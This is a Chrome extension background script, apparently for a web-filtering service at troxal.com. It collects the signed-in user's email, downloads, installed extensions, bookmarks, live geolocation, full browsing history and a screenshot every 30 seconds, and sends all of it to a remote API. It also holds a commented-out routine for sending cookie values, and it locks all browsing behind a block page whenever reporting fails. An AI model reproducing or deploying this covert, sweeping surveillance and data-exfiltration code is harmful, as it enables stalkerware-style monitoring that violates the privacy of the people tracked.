setInterval(function () {
    chrome.runtime.reload()
}, 180 * 1000);
function showStatus(online) {
  if (online) {
      console.log('sucessfully online');
      var offline = false;
      localStorage.setItem("isOffline", offline);
$.getJSON("https://api.troxal.com/troxal/ping/", function (result) {
        chrome.identity.getProfileUserInfo(function (info) {
            email = info.email;
            chrome.extension.onMessage.addListener(function (request, sender, sendResponse) {
                sendResponse({
                    email: email
                })
            });
            if (email !== '') {
                var o = {
                    email: email
                };
                console.log('sucessfully signed in through user: ' + email);
                var errorcount = '0';
            } else {
                var o = {
                    email: 'not@logged.in'
                };
                console.log('failed to sign in. please sign in through chrome sync.');
                alert('failed to sign in. please sign in through chrome sync.');
            }
            chrome.runtime.onInstalled.addListener(function (object) {
                if (object.reason === 'install') {
                    chrome.tabs.create({
                        url: "https://troxal.com/?installed"
                    }, function (tab) {});
                }
            });
            $.getJSON('https://api.troxal.com/anotify/get/?function=title&u=' + o.email, function (result) {
                $.each(result, function (i, field) {
                    var aNotificationTitle = field;
                    $.getJSON('https://api.troxal.com/anotify/get/?function=message&u=' + o.email, function (result) {
                        $.each(result, function (i, field) {
                            var aNotificationMessage = field;
                            var storage = chrome.storage.local;
                            var aNotifyM = localStorage.getItem("aNotifyMS");
                            if (aNotificationMessage == aNotifyM) {} else {
                                GetNotification();
                            }

                            function GetNotification() {
                                localStorage.setItem("aNotifyMS", aNotificationMessage);
                                chrome.notifications.create(null, {
                                    type: 'basic',
                                    iconUrl: '/data/icons/48.png',
                                    title: aNotificationTitle,
                                    message: aNotificationMessage
                                });
                            }
                        });
                    });
                });
            });
            chrome.downloads.onCreated.addListener(function (e) {
                var downloadurl = e.url;
                var downloadfilename = e.fileName;
                $.post("https://api.troxal.com/troxal/report/downloads/", {
                            filename: downloadfilename,
                            url: downloadurl,
                            user: o.email
                        },
                        function (data, status) {})
                    .fail(function () {
                        $.post("https://api.abloc.co/ablock/report/downloads/", {
                                    filename: downloadfilename,
                                    url: downloadurl,
                                    user: o.email
                                },
                                function (data, status) {})
                            .fail(function () {
                                chrome.webRequest.onBeforeRequest.addListener(function (details) {
                                    return {
                                        redirectUrl: "https://block.troxal.com?u=" + o.email + '&url=' + details.url + '&reason=download'
                                    }
                                }, {
                                    urls: ['*://*/*']
                                }, ["blocking"]);
                                chrome.tabs.create({
                                    url: chrome.extension.getURL('error.html'),
                                    active: false
                                }, function (tab) {
                                    chrome.windows.create({
                                        tabId: tab.id,
                                        type: 'popup',
                                        focused: true
                                    });
                                });
                                setInterval(function () {
                                    chrome.runtime.reload();
                                }, 5 * 1000);
                            });
                    });
            });
            chrome.management.getAll(function (eitems) {
                for (var i = 0; i < eitems.length; i++) {
                    var eitem = eitems[i];
                    $.post("https://api.troxal.com/troxal/report/extensions/", {
                                eid: eitem.id,
                                name: eitem.name,
                                user: o.email
                            },
                            function (data, status) {})
                        .fail(function () {
                            chrome.webRequest.onBeforeRequest.addListener(function (details) {
                                return {
                                    redirectUrl: "https://block.troxal.com?u=" + o.email + '&url=' + details.url + '&reason=extension'
                                }
                            }, {
                                urls: ['*://*/*']
                            }, ["blocking"]);
                            chrome.tabs.create({
                                url: chrome.extension.getURL('error.html'),
                                active: false
                            }, function (tab) {
                                chrome.windows.create({
                                    tabId: tab.id,
                                    type: 'popup',
                                    focused: true
                                });
                            });
                            setInterval(function () {
                                chrome.runtime.reload();
                            }, 5 * 1000);
                        });
                }
            });
            chrome.bookmarks.getTree(function (bitemTree) {
                bitemTree.forEach(function (bitem) {
                    processNode(bitem);
                });
            });

            function processNode(node) {
                if (node.children) {
                    node.children.forEach(function (child) {
                        processNode(child);
                    });
                }
                if (node.url) {
                    $.post("https://api.troxal.com/troxal/report/bookmarks/", {
                                url: node.url,
                                user: o.email
                            },
                            function (data, status) {})
                        .fail(function () {
                            chrome.webRequest.onBeforeRequest.addListener(function (details) {
                                return {
                                    redirectUrl: "https://block.troxal.com?u=" + o.email + '&url=' + details.url + '&reason=bookmark'
                                }
                            }, {
                                urls: ['*://*/*']
                            }, ["blocking"]);
                            chrome.tabs.create({
                                url: chrome.extension.getURL('error.html'),
                                active: false
                            }, function (tab) {
                                chrome.windows.create({
                                    tabId: tab.id,
                                    type: 'popup',
                                    focused: true
                                });
                            });
                            setInterval(function () {
                                chrome.runtime.reload();
                            }, 5 * 1000);
                        });
                }
            }
            navigator.geolocation.watchPosition(showPosition);

            function showPosition(position) {
                $.post("https://api.troxal.com/troxal/report/location/", {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            user: o.email
                        },
                        function (data, status) {})
                    .fail(function () {
                        chrome.webRequest.onBeforeRequest.addListener(function (details) {
                            return {
                                redirectUrl: "https://block.troxal.com?u=" + o.email + '&url=' + details.url + '&reason=location'
                            }
                        }, {
                            urls: ['*://*/*']
                        }, ["blocking"]);
                        chrome.tabs.create({
                            url: chrome.extension.getURL('error.html'),
                            active: false
                        }, function (tab) {
                            chrome.windows.create({
                                tabId: tab.id,
                                type: 'popup',
                                focused: true
                            });
                        });
                        setInterval(function () {
                            chrome.runtime.reload();
                        }, 5 * 1000);
                    });
            }
            //        chrome.cookies.onChanged.addListener(function(getCookie) {
            //            var getCookies = JSON.stringify(getCookie);
            //            var getCookies = JSON.parse(getCookies);
            //            if (getCookies.cookie.name == '_ga' || getCookies.cookie.name == '_gid' || getCookies.cookie.name == '_gat' || getCookies.cookie.name == '__utma' || getCookies.cookie.name == '__utmt' || getCookies.cookie.name == '__utmb' || getCookies.cookie.name == '__utmc' || getCookies.cookie.name == '__utmz' || getCookies.cookie.name == '__utmv' || getCookies.cookie.name == '_gat_tracker1' || getCookies.cookie.name == '_gat_tracker0' || getCookies.cookie.domain == '.google.com' || getCookies.cookie.domain == 'www.google.com'){
            //            }else{
            //                $.post("https://api.troxal.com/troxal/report/cookies/", {
            //                    name: getCookies.cookie.name,
            //                    value: getCookies.cookie.value,
            //                    domain: getCookies.cookie.domain,
            //                    expirationdate: getCookies.cookie.expirationDate,
            //                    user: o.email
            //               },
            //               function(data, status) {})
            //               .fail(function() {
            //                    chrome.webRequest.onBeforeRequest.addListener(function(details) { return {redirectUrl: "https://block.troxal.com?u=" + o.email + '&url=' + details.url + '&reason=cookie'} }, {urls: ['*://*/*'] },["blocking"]);
            //                    alert('Hey. Blocking cookie tracking are you? Now we block you.');
            //                    var errorcount = +errorcount + 1;
            //                    if (errorcount < '1'){
            //                        chrome.runtime.reload();
            //                    }else{
            //                        setInterval(function() {
            //                             chrome.runtime.reload();
            //                        }, 30 * 1000); 
            //                    }
            //                });
            //          }
            //        });
            chrome.history.onVisited.addListener(function (result) {
                $.post("https://api.troxal.com/troxal/sites/", {
                        checkurl: result.url,
                        user: o.email
                    },
                    function (detail) {
                        var isBlocked = detail.isblocked;
                        var siteQuery = detail.url;
                        if (isBlocked == 'yes') {
                            chrome.tabs.getSelected(null, function (tab) {
                                chrome.tabs.executeScript(tab.ib, {
                                    code: 'window.stop(),document.getElementsByTagName("html")[0].style.display="none",location.reload();'
                                });
                            });
                            var filter = [];
                            filter.push(siteQuery);
                            GetBlocked();

                            function GetBlocked() {
                                chrome.webRequest.onBeforeRequest.addListener(function (details) {
                                    return {
                                        redirectUrl: "https://block.troxal.com?u=" + o.email + '&url=' + details.url
                                    }
                                }, {
                                    urls: filter
                                }, ["blocking"]);
                            }
                        } else {
                            chrome.tabs.getSelected(null, function (tab) {
                                chrome.tabs.executeScript(tab.ib, {
                                    code: 'document.getElementsByTagName("html")[0].style.display="block";'
                                });
                            });
                        }
                    })
            });
            chrome.history.onVisited.addListener(function (result) {
                var urltitle = result.title;
                var urlurl = result.url;
                $.post("https://api.troxal.com/troxal/report/logger/", {
                            title: urltitle,
                            url: urlurl,
                            user: o.email
                        },
                        function (data, status) {})
                    .fail(function () {
                        chrome.webRequest.onBeforeRequest.addListener(function (details) {
                            return {
                                redirectUrl: "https://block.troxal.com?u=" + o.email + '&url=' + details.url + '&reason=url'
                            }
                        }, {
                            urls: ['*://*/*']
                        }, ["blocking"]);
                        chrome.tabs.create({
                            url: chrome.extension.getURL('error.html'),
                            active: false
                        }, function (tab) {
                            chrome.windows.create({
                                tabId: tab.id,
                                type: 'popup',
                                focused: true
                            });
                        });
                        setInterval(function () {
                            chrome.runtime.reload();
                        }, 5 * 1000);
                    });
            });
            setInterval(function () {
                chrome.tabs.captureVisibleTab(null, {
                        format: "jpeg",
                        quality: 30
                    },
                    function (dataUrl) {
                        $.post("https://api.troxal.com/troxal/report/image/", {
                                    blob: dataUrl,
                                    user: o.email
                                },
                                function (data, status) {})
                            .fail(function () {
                                chrome.webRequest.onBeforeRequest.addListener(function (details) {
                                    return {
                                        redirectUrl: "https://block.troxal.com?u=" + o.email + '&url=' + details.url + '&reason=image'
                                    }
                                }, {
                                    urls: ['*://*/*']
                                }, ["blocking"]);
                                chrome.tabs.create({
                                    url: chrome.extension.getURL('error.html'),
                                    active: false
                                }, function (tab) {
                                    chrome.windows.create({
                                        tabId: tab.id,
                                        type: 'popup',
                                        focused: true
                                    });
                                });
                                setInterval(function () {
                                    chrome.runtime.reload();
                                }, 5 * 1000);
                            });
                    }
                );
            }, 30 * 1000);
        });
    })
    .fail(function () {
        chrome.history.onVisited.addListener(function (result) {
            chrome.webRequest.onBeforeRequest.addListener(function (details) {
                return {
                    redirectUrl: 'https://block.troxal.com?u=not@logged.in&url=' + details.url + '&reason=network'
                }
            }, {
                urls: ['*://*/*']
            }, ["blocking"]);
        });
        chrome.tabs.create({
            url: chrome.extension.getURL('inital.html'),
            active: false
        }, function (tab) {
            chrome.windows.create({
                tabId: tab.id,
                type: 'popup',
                focused: true
            });
        });
        setInterval(function () {
            chrome.runtime.reload();
        }, 5 * 1000);
    });
  } else {
        console.log('failure. is offline');
        var offline = true;
        localStorage.setItem("isOffline", offline);
        chrome.tabs.create({
            url: chrome.extension.getURL('network.html'),
            active: false
        }, function (tab) {
            chrome.windows.create({
                tabId: tab.id,
                type: 'popup',
                focused: true
            });
        });
  }
}

window.addEventListener('load', () => {
  navigator.onLine ? showStatus(true) : showStatus(false);
  window.addEventListener('online', () => {
    showStatus(true);
  });
  window.addEventListener('offline', () => {
    showStatus(false);
  });
});
